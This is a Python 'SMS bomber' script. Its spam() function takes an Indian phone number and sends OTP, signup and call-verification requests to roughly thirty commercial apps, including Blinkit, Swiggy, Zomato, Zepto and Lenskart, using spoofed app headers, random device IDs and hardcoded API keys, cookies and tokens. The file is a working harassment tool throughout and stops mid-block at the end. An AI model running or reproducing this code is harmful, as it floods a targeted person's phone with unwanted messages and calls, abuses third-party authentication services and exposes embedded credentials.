import requests
import random
import string
import json
import time

def generate_uuid():
    uuid = ''.join(random.choices(string.hexdigits.lower(), k=32))
    formatted_uuid = f"{uuid[:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:20]}-{uuid[20:]}"
    return formatted_uuid
    
def generate_string(length=10):
    word = ''.join(random.choices(string.ascii_letters, k=length))
    return word

def generate_device_id(length=16):
    device_id = ''.join(random.choices(string.hexdigits.lower(), k=length))
    return device_id

def spam(num):

    phonenumber = num.replace(" ","").replace("+91","")
    print(f"Sms Bombing : {phonenumber}")
   
     # URL for the API
    url = 'https://api2.grofers.com/v2/accounts/'
    
    # Headers
    headers = {
        'Host': 'api2.grofers.com',
        'Connection': 'keep-alive',
        'host_app': 'blinkit',
        'version_name': '16.37.0',
        'app_client': 'consumer_android',
        'Accept': 'application/json',
        'app_version': '80160370',
        'version_code': '80160370',
        'qd_sdk_request': 'true',
        'qd_sdk_version': '1',
        'rn_bundle_version': '1009002001',
        'app_api_version': '34',
        'X-APP-THEME': 'default',
        'X-APP-APPEARANCE': 'default',
        'X-SYSTEM-THEME': 'unspecified',
        'screen_density': '1080px',
        'screen_density_num': '2.75',
        'cpu-level': 'AVERAGE',
        'memory-level': 'HIGH',
        'storage-level': 'EXCELLENT',
        'network-level': 'AVERAGE',
        'battery-level': 'AVERAGE',
        'is_accessibility_enabled': 'false',
        'lat': '0.0',
        'lon': '0.0',
        'x-zomato-installed': 'true',
        'x-rider-installed': 'false',
        'entry_source': 'default',
        'session_uuid': generate_uuid(),  # Replace with your actual session_uuid
        'device_id': generate_device_id(),  # Replace with your actual device_id
        'auth_key': '45bff2b1437ff764d5e5b9b292f9771428e18fc40b7f3b7303d196ea84ab4341',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'com.grofers.customerapp/280160370 (Linux; U; Cronet/131.0.6738.0)',
        'Accept-Encoding': 'gzip, deflate, br'
    }
    
    data = {
        'country_code': '91',
        'otp_mode': 'SMS',
        'user_phone': phonenumber,  # Replace with the phone number
        'build_variant': 'release'
    }
    
    response = requests.post(url, headers=headers, data=data)
    print(f"Blinkit   : {response.status_code}")
    
    
    
    
    url = 'https://api-consumer.bharatpe.in/login/otp/generate'
    headers = {
        'platform': '0',
        'clientid': 'postpe',
        'token': '',
        'simId': '',
        'appversion': '216',
        'lat': 'null',
        'lon': 'null',
        'Content-Type': 'application/json; charset=UTF-8',
        'Host': 'api-consumer.bharatpe.in',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'User-Agent': 'okhttp/4.9.3'
    }
    data = {
        'mobile': phonenumber,
        'hashKey': "jdjeuu673" #try changing this 
    }
    
    response = requests.post(url, headers=headers, json=data)
    
    print(f"BharatPe   : {response.status_code}")
    
    
    
    
    
    
    
    url = 'https://www.bigbasket.com/member-tdl/v3/member/otp/'
    
    headers = {
        'tracestate': '@nr=0-2-837304-6616301-c6ff67a100c0404c----1731350164849',
        'newrelic': 'eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiODM3MzA0IiwiYXAiOiI2NjE2MzAxIiwidHIiOiIzMGYxNDNjYjg4MDI0NzFhOGU2NDRiNzNkNTE0MWRmNCIsImlkIjoiYzZmZjY3YTEwMGMwNDA0YyIsInRpIjoxNzMxMzUwMTY0ODQ5fX0=',
        'traceparent': '00-30f143cb8802471a8e644b73d5141df4-c6ff67a100c0404c-00',
        'User-Agent': 'BB Android/v7.15.90/os 14',
        'x-csurftoken': 'J8AujA.NDU3NzMxMzIwNjcwMTIyNzM0.1731350113068.djhr+OEu2JZnVtOmN8YUiN5RmQVDndIlYNvRw5Rr48I=',
        'Cookie': '_bb_source="app";_bb_vid="NDU3NzMxMzIwNjcwMTIyNzM0"; _bb_aid="Mjk2NTE4NTMwNA=="; _bb_cid="1"; _bb_cda_sa_info="djIuY2RhX3NhLjEwLjEwODQ3LDE1MTU4"; is_global="0"; _bb_lat_long="MTIuOTQyMjMwNHw3Ny41NzQ4Mzc2"; _bb_vid="NDU3NzMxMzIwNjcwMTIyNzM0"; _bb_sa_ids="10847,15158"; _is_tobacco_enabled="1"; _is_bb1.0_supported="0"; _bb_addressinfo="MTIuOTQyMjMwNHw3Ny41NzQ4Mzc2fDU2MDAwNHw1NjAwMDR8QmFuZ2Fsb3JlfDF8ZmFsc2V8dHJ1ZXx0cnVlfEJpZ2Jhc2tldGVlcg=="; csurftoken="J8AujA.NDU3NzMxMzIwNjcwMTIyNzM0.1731350113068.djhr+OEu2JZnVtOmN8YUiN5RmQVDndIlYNvRw5Rr48I="; csrftoken="he7cio5cil4zZ0KSkfuC7IS8ifUYPuFS6uXx7ChrbqO3F4Gze4bwoMKnK7dWC3cY"; _bb_pin_code="560004"; _bb_bb2.0="1"; is_integrated_sa="1"; ts="2024-11-12%2000:05:13.862"',
        'X-Entry-context-id': '10',
        'X-Entry-context': 'bbnow',
        'X-channel': 'BB-Android',
        'X-Tcp-Platform': 'native',
        'X-Tcp-Device-Version': 'android_7.15.90_2291910',
        'common-client-static-version': '101',
        'x-device-id': generate_device_id(),
        'x-is-debug': 'false',
        'x-integrated-fc-door-visible': 'false',
        'Content-Type': 'application/json; charset=UTF-8',
        'Content-Length': '54',
        'Host': 'www.bigbasket.com',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'X-NewRelic-ID': 'XAUAUlZXGwUGVVdRBwA=',
    }
    
    data = {
        'identifier': phonenumber,
        'referrer': 'unified_login'
    }
    
    response = requests.post(url, headers=headers, json=data)
    
    print(f"Bigbasket   : {response.status_code}")
    
    
    
    
    
    
    
    url = 'https://securedapi.confirmtkt.com/api/platform/registerOutput'
    params = {
        'mobileNumber': phonenumber,
        'newOtp': 'true',
        'retry': 'false',
        'hashOtp': 'true',
        'fireBaseSMSvendor': 'karix',
        'locale': 'en',
        'channel': 'Android',
        'appVersion': '416',
        'session': ''
    }
    
    headers = {
        'Host': 'securedapi.confirmtkt.com',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'User-Agent': 'okhttp/4.12.0'
    }
    
    response = requests.get(url, params=params, headers=headers)
    
    # Print the response (for debugging)
    print(f"ConfirmTkt   : {response.status_code}")
    
    
    
    
    
    
    url = 'https://api.countrydelight.in/api/v1/customer/requestOtp'
    
    headers = {
        'x-source': 'Android',
        'x-language': 'en',
        'x-os': '14',
        'x-app-version-name': '9.7.0',
        'x-app-version-code': '471',
        'x-version-code': '471',
        'x-chatbot-version': '40',
        'x-release-version': '33',
        'x-rapid-version': '1',
        'Content-Type': 'application/json; charset=UTF-8',
        'Host': 'api.countrydelight.in',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'User-Agent': 'okhttp/4.10.0'
    }
    
    # Data to send in the POST request
    data = {
        "device": "Android",
        "mobile_number": phonenumber,
        "mode": "SMS",
        "new_user": False
    }
    
    # Send the POST request
    response = requests.post(url, headers=headers, json=data)
    
    print(f"CountryD   : {response.status_code}")
    
    
    
    
    
    
    
    
    url = 'https://thanos.faasos.io/v3/customer/generate_otp.json?client_os=eatsure_android&app_version=10320&device_id='
    
    headers = {
        'client-source': '13',
        'brand-id': '134',
        'App-Version': '10320',
        'Client-Os': 'eatsure_android',
        'Content-Type': 'application/json; charset=UTF-8',
        'Host': 'thanos.faasos.io',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'User-Agent': 'okhttp/4.11.0'
    }
    
    # JSON data to send in the request body
    data = {
        "phone_number": phonenumber,
        "country_code": "IND",
        "dialing_code": "+91",
        "is_new_customer": False,
        "communication_channel": "sms"
    }
    
    # Send the POST request
    response = requests.post(url, headers=headers, json=data)
    
    print(f"EatSure   : {response.status_code}")
    
    
    
    
    
    
    url = 'https://node2.licious.in/api/v2/otp-signup'
    
    headers = {
        'auth-mode': 'v2',
        'macid': '',
        'token': '',
        'hubid': '31',
        'hub_id': '31',
        'cityid': '3',
        'source': 'android',
        'app-version': '288',
        'app-version-name': '8.39.0',
        'Content-Type': 'application/json; charset=UTF-8',
        'Content-Length': '69',
        'Host': 'node2.licious.in',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'User-Agent': 'okhttp/4.11.0'
    }
    
    # Data to send in the POST request
    data = {
        "customer_key": "g_m3dbz1rp",
        "phone": phonenumber,
        "captcha_token": ""
    }
    
    # Send the POST request
    response = requests.post(url, headers=headers, json=data)
    
    print(f"Licious   : {response.status_code}")
    
    
    
    
    
    
    
    
    
    
    url = 'https://user-service.parkwheels.co.in/api/v1/user/b2c/otp/send'
    
    headers = {
        'accept-encoding': 'gzip',
        'screen-width': '1080',
        'package-name': 'com.ovunque.parkwheels',
        'authorization': '',
        'device-id': generate_device_id(),
        'client-secret': 'hjjh0uw8c3j7vw5jgba8',
        'screen-height': '2400',
        'os-name': 'UPSIDE_DOWN_CAKE',
        'city-name': '',
        'state-name': '',
        'psk': '',
        'app-name': 'B2C',
        'user-agent': 'Dart/3.5 (dart:io)',
        'version-name': '6.2.21',
        'appsflyer-id': '1731348362981-8131707714990985564',
        'pincode': '',
        'epoch-time': '1731348462046',
        'version-code': '428',
        'content-type': 'application/json',
        'platform': 'android',
        'os-version': '14',
        'client-id': '8186c1be-660f-428c-93a7-6480c2d8af66',
        'host': 'user-service.parkwheels.co.in',
        'device-request-id': '',
        'Content-Length': '29'
    }
    
    data = {
        "phone_number": phonenumber
    }
    
    response = requests.post(url, headers=headers, json=data)
    
    print(f"Park+   : {response.status_code}")
    
    
    
    
    
    
    
    
    url = 'https://mcprod.sparindia.com/graphql'
    headers = {
        'store': 'view_20001',
        'Content-Type': 'application/json',
        'Content-Length': '207',
        'Host': 'mcprod.sparindia.com',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Cookie': 'PHPSESSID=; private_content_version=',
        'User-Agent': 'okhttp/4.9.2'
    }
    
    data = {
        "query": """
        mutation generateCustomerOTP($mobileNumber: String!) {
            generateCustomerOTP(mobile_number:$mobileNumber ) {
                otp
            }
        }
        """,
        "variables": {
            "mobileNumber": phonenumber,
            "storeId": "view_20001"
        }
    }
    
    response = requests.post(url, headers=headers, json=data)
    
    print(f"SparIndia   : {response.status_code}")
    
    
    
    
    
    
    
    
    
    
    
    url = f'https://profile.swiggy.com/api/v3/app/sms_otp?mobile={phonenumber}'
    headers = {
        'pl-version': '83',
        'User-Agent': 'Swiggy-Android',
        'Content-Type': 'application/json; charset=utf-8',
        'version-code': '1293',
        'app-version': '4.67.3',
        'Connection': 'keep-alive',
        'os-version': '14',
        'accessibility_enabled': 'false',
        'X-NETWORK-QUALITY': 'MODERATE',
        'Accept-Encoding': 'gzip',
        'Accept': 'application/json; charset=utf-8',
        'Host': 'profile.swiggy.com',
        'X-NewRelic-ID': 'UwUAVV5VGwIEXVJRAwcO'
    }
    
    response = requests.get(url, headers=headers)
    
    print(f"Swiggy   : {response.status_code}")
    
    
    
    
    
    
    url = 'https://api.1mg.com/api/v6/create_token'
    
    headers = {
        'X-Platform': 'Android-18.5.0',
        'X-Access-Key': '1mg_client_access_key',
        'X-OS-Version': '14',
        'Content-Type': 'application/json; charset=UTF-8',
        'Content-Length': '42',
        'Host': 'api.1mg.com',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'User-Agent': 'okhttp/4.12.0'
    }
    
    data = {
        "otp_on_call": True,
        "number": phonenumber
    }
    
    response = requests.post(url, headers=headers, json=data)
    
    print(f"1mg_call   : {response.status_code}")
    
    
    data = {
        "otp_on_call": False,
        "number": phonenumber
    }
    
    response = requests.post(url, headers=headers, json=data)
    
    print(f"1mg   : {response.status_code}")
    
    
    
    
    
    
    
    
    
    url = 'https://api.zepto.co.in/api/v1/user/customer/signup/'
    
    deviceuid = generate_device_id()
    sesid = generate_device_id(32)
    reqid = generate_device_id(32)
    headers = {
        'accept': 'application/json',
        'access-control-allow-credentials': 'true',
        'x-requested-with': 'XMLHttpRequest',
        'sessionid': sesid,
        'session_id': sesid,
        'appversion': '24.11.2',
        'app_version': '24.11.2',
        'deviceuid': deviceuid,
        'device_uid': deviceuid,
        'platform': 'android',
        'systemversion': '14',
        'system_version': '14',
        'source': 'PLAY_STORE',
        'compatible_components': 'SAMPLING_FOR_COUPON_MOV_ENABLED,CONVENIENCE_FEE,RAIN_FEE,EXTERNAL_COUPONS,STANDSTILL,BUNDLE,MULTI_SELLER_ENABLED,PIP_V1,ROLLUPS,SAMPLING_ENABLED,ETA_NORMAL_WITH_149_DELIVERY,ROLLUPS_UOM,SAMPLING_V2,RE_PROMISE_ETA_ORDER_SCREEN_ENABLED,RECOMMENDED_COUPON_WIDGET,NZS_CAMPAIGN_COMPONENT,ETA_NORMAL_WITH_199_DELIVERY,NEW_FEE_STRUCTURE,PHARMA_ENABLED,REWARDS_WIDGET_MISSION_V2,GAMIFICATION_ENABLED,DYNAMIC_FILTERS,HOMEPAGE_V2,COUPON_WIDGET_CART_REVAMP,AUTOSUGGESTION_PIP,NEW_ETA_BANNER,CART_TABBED_WIDGET,IS_DYNAMIC_NZS_SUPPORTED,ZEPTO_THREE,RERANKING_QCL_RELATED_PRODUCTS,AUTO_COD_ORDER_ENABLED,PAAN_BANNER_WIDGETIZED,SINGLE_CLICK_COD_PAYMENT,AUTOSUGGESTION_PAGE_ENABLED,COUPON_UPSELLING_WIDGET,DELIVERY_UPSELLING_WIDGET,CART_BOX_MODEL_WIDGETS,NEW_WALLET_INFO,REFERRAL_P2,PDP_TOP_PRODUCT_BANNER,AUTOSUGGESTION_AD_PIP,VERTICAL_FEED_PRODUCT_GRID,SWAP_LOGIC_CART_PAGE,3x3_PRODUCT_GRID_WIDGET,BOTTOM_NAV_FULL_ICON,RECOMMENDED_PRODUCTS_VERTICAL_GRID,OOS_RECOMMENDATIONS,PRE_SEARCH,PRE_SEARCH_2.0,NEW_BILL_INFO,ZEPTO_PASS,ZEPTO_PASS:3,ZEPTO_PASS_RENEWAL,MANUALLY_APPLIED_DELIVERY_FEE_RECEIVABLE,AUTO_COD_ORDER_ENABLED_V2,PLP_ON_SEARCH,NEW_ROLLUPS_ENABLED,RICH_PRODUCT_CARD_GRID,RPCC_TIMER,MARKETPLACE_REPLACEMENT,MARKETPLACE_CATEGORY_GRID,VBD,CROSS_SELL_V2,ITEMISATION_ENABLED,COUPON_BOTTOM_STRIP,TABBED_CAROUSEL_V2,SUPERSTORE_V1,API_MIGRATION_V1,SEARCH_FILTERS_V1,SUPER_SAVER:1,FTB_ELC:0,PLP_NO_PRODUCTS_SUPPORT_FIX,PRODUCT_LIST_BOTTOM_SHEET,BUY_AGAIN_V3,GIFT_CARD,SCOPED_SEARCH_V1,FLASH_SALE_V3,NO_BAG,GIFTING_ENABLED,OFSE,PROMO_CASH:0,L4_ATTRIBUTES_ENABLED,TRUSTMARKER_V2,CART_REDESIGN_ENABLED,HYPER_UPI',
        'store_id': '',
        'tobaccoconsentgiven': 'false',
        'tobacco_consent_given': 'false',
        'isinternaluser': 'false',
        'is_internal_user': 'false',
        'requestid': reqid,
        'request_id': reqid,
        'bundleversion': '',
        'bundle_version': '',
        'is_new_font': 'true',
        'accept-encoding': 'gzip',
        'Content-Type': 'application/json; charset=utf-8',
        'Content-Length': '62',
        'Host': 'api.zepto.co.in',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/4.9.3'
    }
    
    data = {
        "signupType": "otp_sms",
        "data": {
            "mobile_number": phonenumber
        }
    }
    
    response = requests.post(url, headers=headers, json=data)
    
    print(f"Zepto(201)   : {response.status_code}")
    
    
    
    
    
    
    
    url = 'https://accounts.zomato.com/login/phone'
    
    headers = {
        'X-Present-Lat': '0.0',
        'x-perf-class': 'PERFORMANCE_AVERAGE',
        'X-User-Defined-Lat': '0.0',
        'X-Bluetooth-On': 'false',
        'X-Accessibility-Voice-Over-Enabled': '0',
        'User-Agent': '&source=android_market&version=14&device_manufacturer=Xiaomi&device_brand=POCO&device_model=2201116PI&api_version=861&app_version=v18.6.1',
        'X-Device-Language': 'en-IN',
        'X-RIDER-INSTALLED': 'false',
        'X-Present-Long': '0.0',
        'X-Client-Id': 'zomato_android_v2',
        'X-Network-Type': 'wifi',
        'X-App-Language': '&lang=en&android_language=en&android_country=',
        'X-FIREBASE-INSTANCE-ID': '1f5e71fb7af96a61cd651c64a0ac7b1e',
        'X-Device-Pixel-Ratio': '2.75',
        'X-O2-City-Id': '-1',
        'X-Zomato-App-Version-Code': '1710018610',
        'Accept': 'image/webp',
        'X-Present-Horizontal-Accuracy': '-1',
        'X-XTREME-INSTALLED': 'false',
        'X-Zomato-App-Version': '861',
        'X-City-Id': '-1',
        'X-Device-Width': '1080',
        'pragma': 'akamai-x-get-request-id,akamai-x-cache-on, akamai-x-check-cacheable',
        'X-VPN-Active': '1',
        'X-Device-Height': '2323',
        'X-User-Defined-Long': '0.0',
        'X-Keyboard-Language': 'en-IN',
        'X-Installer-Package-Name': 'com.android.vending',
        'X-BLINKIT-INSTALLED': 'false',
        'X-Accessibility-Dynamic-Text-Scale-Factor': '1.0',
        'USER-BUCKET': '0',
        'USER-HIGH-PRIORITY': '0',
        'is-akamai-video-optimisation-enabled': '0',
        'Accept-Encoding': 'br, gzip',
        'X-APP-THEME': 'default',
        'X-APP-APPEARANCE': 'LIGHT',
        'X-SYSTEM-APPEARANCE': 'UNSPECIFIED',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '122',
        'Host': 'accounts.zomato.com',
        'Connection': 'Keep-Alive'
    }
    
    data = {
        'number': phonenumber,
        'country_id': '1',
        'lc': '00',
        'type': 'initiate',
        'verification_type': 'sms',
        'package_name': 'com.application.zomato',
        'message_uuid': ''
    }
    
    response = requests.post(url, headers=headers, data=data)
    
    print(f"Zomato   : {response.status_code}")
    
    
    
    
    
        
    url = 'https://apis.bisleri.com/send-otp'
    headers = {
        'Host': 'apis.bisleri.com',
        'Connection': 'keep-alive',
        'Content-Length': '143',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Android WebView";v="128"',
        'sec-ch-ua-mobile': '?1',
        'Authorization': 'Bearer null',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 14; Build Mobile Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'X-Requested-With': '7Yhm6b86qTsrpcMWtUixPLnv02nHf3wFf5vkukwu',
        'sec-ch-ua-platform': '"Android"',
        'Origin': 'https://localhost',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://localhost/',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8'
    }

    data = {
        'name': generate_string(6),
        'email': f'{generate_string(10)}@gmail.com',
        'mobile': phonenumber,
        'dob': '',
        'referral_code': '',
        'smsHash': 'hfjna7mRtgp',
        'source': 'app',
        'os': 'Android'
    }

    response = requests.post(url, headers=headers, json=data)

    print(f"Bisleri   : {response.status_code}")
    
    
    
    
    
    url = 'https://cf.citymall.live/api/cl-user/auth/get-otp'
    headers = {
        'accept': 'application/json, text/plain, */*',
        'x-app-name': 'CX',
        'x-app-version': '1.40.0',
        'x-app-version-cp': '1.40.0-cms-v2',
        'x-app-version-code': '226',
        'x-ios-app-code': '6',
        'x-app-package': 'live.citymall.customer.prod',
        'x-app-path': '/data/user/0/live.citymall.customer.prod',
        'use-applinks': 'true',
        'x-platform-os': 'android',
        'Content-Type': 'application/json',
        'Content-Length': '61',
        'Host': 'cf.citymall.live',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'User-Agent': 'okhttp/4.9.2'
    }

    data = {
        'phone_number': phonenumber,
        'source': 'app',
        'otpEscape': True
    }

    response = requests.post(url, headers=headers, json=data)

    print(f"CityMall   : {response.status_code}")

    
    
    
    
    

    url = 'https://services.dealshare.in/userservice/api/v1/user-login/send-login-code'
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en',
        'lang': 'en',
        'appversion': '1.3.1',
        'cpversion': '1',
        'ab-config': '{"mov_experiment":"default","ranking_experiment":"default"}',
        'channel': 'APP',
        'businessmodel': 'B2C',
        'platform': 'android',
        'source': 'app',
        'phone': phonenumber,
        'buefdnwdei': 'true',
        'x-datadog-origin': 'rum',
        'x-datadog-sampling-priority': '0',
        'Content-Type': 'application/json',
        'Content-Length': '150',
        'Host': 'services.dealshare.in',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'User-Agent': 'okhttp/4.11.0'
    }

    data = {
        'phoneNumber': phonenumber,
        'name': phonenumber,
        'hashCode': 'k387IsBaTmn',
        'resendOtp': 0,
        'source': 'app',
        'loginType': 'OTP',
        'deviceId': generate_device_id(),
    }

    response = requests.post(url, headers=headers, json=data)

    print(f"DealShare   : {response.status_code}")
    
    
    
    
    
    url = 'https://api-gateway.juno.lenskart.com/v3/customers/sendOtp'

    headers = {
        'x-country-code-override': 'IN',
        'accept-language': 'en',
        'x-session-token': '07ef6c82-4891-4d90-becb-4dc546fb4068',
        'appversion': '4.5.7 (241029001)',
        'Accept-Encoding': 'gzip',
        'X-Build-Version': '241029001',
        'api_key': 'valyoo123',
        'x-accept-language': 'en',
        'x-api-client': 'android',
        'x-country-code': 'IN',
        'brand': 'xiaomi',
        'Content-Type': 'application/json',
        'x-app-version': '4.5.7 (241029001)',
        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 14; SocketSucks)',
        'Host': 'api-gateway.juno.lenskart.com',
        'Connection': 'Keep-Alive',
        'Content-Length': '44'
    }

    data = {
        'phoneCode': '+91',
        'telephone': phonenumber
    }

    response = requests.post(url, headers=headers, json=data)
    print(f"Lenskart   : {response.status_code}")
    
        
        
        

    
    url = 'https://app.glowroad.com/api/generateotp'
    headers = {
        'apiVersion': '5',
        'appVersion': '4.9.3',
        'LQVersionCode': '493',
        'language': 'en_IN',
        'Content-Type': 'application/json; charset=UTF-8',
        'Content-Length': '189',
        'Host': 'app.glowroad.com',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'User-Agent': 'okhttp/5.0.0-alpha.14'
    }

    data = {
        'bankEdit': False,
        'country': 'IN',
        'dialCode': '91',
        'encryptRequest': {
            'isEncrypted': False,
            'requestDetails': '',
            'requestParam': ''
        },
        'hasCode': 'UMhncSsgp+6',
        'isResend': False,
        'mobile': phonenumber,
    }

    response = requests.post(url, headers=headers, json=data)

    print(f"GlowRoad   : {response.status_code}")





     
     
    url = 'https://api.thesouledstore.com/api/v2/register-otp'
    headers = {
        'accept': 'application/json',
        'Content-Type': 'application/json',
        'Content-Length': '189',
        'Host': 'api.thesouledstore.com',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'User-Agent': 'okhttp/4.11.0'
    }

    data = {
        'firstname': generate_string(6),
        'lastname': generate_string(6),
        'email': f'{generate_string(10)}@gmail.com',
        'password': sesid[0:10],
        'cpassword': sesid[0:10],
        'telephone': phonenumber,
        'gender': 'M',
        'token': '',
        'birthdate': '1999-01-01'
    }

    response = requests.post(url, headers=headers, json=data)
   
    print(f"SouledStore   : {response.status_code}")
    


        
    

    url = 'https://prod-ds-express.asort.com/api/v1/m/auth/signup'

    headers = {
        'accept': 'application/json',
        'user-agent': 'App-android',
        'cache-control': 'no-cache, must-revalidate',
        'Content-Type': 'application/json; charset=utf-8',
        'Host': 'prod-ds-express.asort.com',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip'
    }

    data = {
        "name": generate_string(6),
        "mobile": phonenumber,
        "fcid": 7869115,
        "auto_referral": 1,
        "affiliateKey": ""
    }

    response = requests.post(url, json=data, headers=headers)

    print(f"Asort   : {response.status_code}")
    
    
        
        
    
    url = 'https://qr.fiatpayments.com/v2/api/send-otp/'

    headers = {
    'User-Agent': 'Dart/3.4 (dart:io)',
    'Accept': 'application/json',
    'Accept-Encoding': 'gzip',
    'Host': 'qr.fiatpayments.com',
    'Content-Type': 'application/json',
    'apikey': '0cH50I4Bee5GvGknbeJu3ApLmQAzWKnN'
    }

    data = {
    'phone_number': phonenumber
    }

    response = requests.post(url, headers=headers, json=data)

    print(f"FiatPe WA   : {response.status_code}")

    url = 'https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP'

    headers = {
        'Content-Type': 'application/json',
        'Origin': 'https://dehaat.in',
        'Accept': 'application/json'
    }
    
    data = {
        'mobile_number': phonenumber,
        'client_id': 'kisan-app'
    }

    response = requests.post(url, headers=headers, json=data)

    print(f"Agrevolution   : {response.status_code}")
    
    url = 'https://www.shemaroome.com/users/mobile_no_signup'

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    }

    data = {
        'mobile_no': phonenumber,
        'registration_source': 'organic'
    }

    response = requests.post(url, headers=headers, json=data)

    print(f"Shemaroome   : {response.status_code}")
    
    url = 'https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create'

    data = {
        'country_code': '+91',
        'phone': phonenumber
    }

    headers = {
        'Content-Type': 'application/json'
    }

    response = requests.post(url, headers=headers, json=data)

    print(f"Rappi   : {response.status_code}")
    
    url = 'https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phonenumber}?whatsapp=true'

    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'Accept': 'application/json, text/plain, /',
    'Referer': 'https://www.jockey.in/',  
    'Origin': 'https://www.jockey.in',    
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty'
    }

    response = requests.post(url, headers=headers, json=data)

    print(f"Jockey   : {response.status_code}")
    
    url ='https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phonenumber}'
    
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'Accept': 'application/json, text/plain, /',
    'Referer': 'https://www.jockey.in/',  
    'Origin': 'https://www.jockey.in',    
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty'
    }

    response = requests.post(url, headers=headers, json=data)

    print(f"Jockey sms  : {response.status_code}")


    url = 'https://www.rupee112.com/login-sbm'

    data = {
    'mobile': phonenumber,
    'current_page': 'login',
    'is_existing_customer': '2',
    'device_id': '6797dad901ba0ee03072fbd91bd34a8f'
    }

    headers = {
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded'
    }

    response = requests.post(url, headers=headers, json=data)

    print(f"Rupee login  : {response.status_code}")
    
    url ='https://www.rupee112.com/resend-otp'
    
    data = {
    'cust_profile_id': 'UTdWPg42XDgPOgthADY-',
    'mobile': phonenumber,
    'current_page': 'resend_otp'
    }
    
    headers = {
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded'
    }    

    response = requests.post(url, headers=headers, json=data)

    print(f"Rupee resend  : {response.status_code}")

    url = 'https://feedback.crownit.in/api/get/term-and-cond-status'

    headers = {
    'Content-Type': 'application/json',
    'Authorization': 'Basic NjY2Nzo3NTliMDY0Zi0zODFkLTExZTUtODEwYi0wMjg2Yzk2ZDI2NDE=',  
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'Origin': 'https://feedback.crownit.in',
    'Referer': 'https://feedback.crownit.in/lite/profile'
    }

    data = {
    'phone_no': phonenumber
    }
    
    response = requests.post(url, headers=headers, json=data)

    print(f"Crownit sms  : {response.status_code}")  
    
    url = 'https://communication.api.hungama.com/v1/communication/otp'

    data = {
    'mobileNo': phonenumber,
    'countryCode': '+91',
    'appCode': 'un',
    'messageId': '1',
    'emailId': '',
    'subject': 'Register',
    'priority': '1',
    'device': 'web',
    'variant': 'v1',
    'templateCode': '1'
    }

    headers = {
    'Content-Type': 'application/json'
    }

    response = requests.post(url, headers=headers, json=data)

    print(f"Hungama  : {response.status_code}")  
    
    url = 'https://vyaparapp.in/check/user'
    
    data = {
    '_token':'k5WJ0Qv8LcNtePphp9X8fF43utuXoZiuwgSKfyCm',
    'country_code':'91',
    'remaining_trial_period':'0',
    'phone': phonenumber,
    'firebase_otp':'',
    'email':''
    }
    
    headers = {
    'accept': '/',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://vyaparapp.in',
    'referer': 'https://vyaparapp.in/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest'
    }
    
    response = requests.post(url, headers=headers, json=data)

    print(f"Vyapara sms  : {response.status_code}")
    
    
    url = 'https://www.shemaroome.com/users/mobile_no_signup'
    
    
    

    data = {
    'mobile_no': phonenumber,
    'registration_source': 'organic'
    }
    
    headers = {
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'Origin': 'https://www.shemaroome.com',
    'Referer': 'https://www.shemaroome.com/users/sign_in'
    }

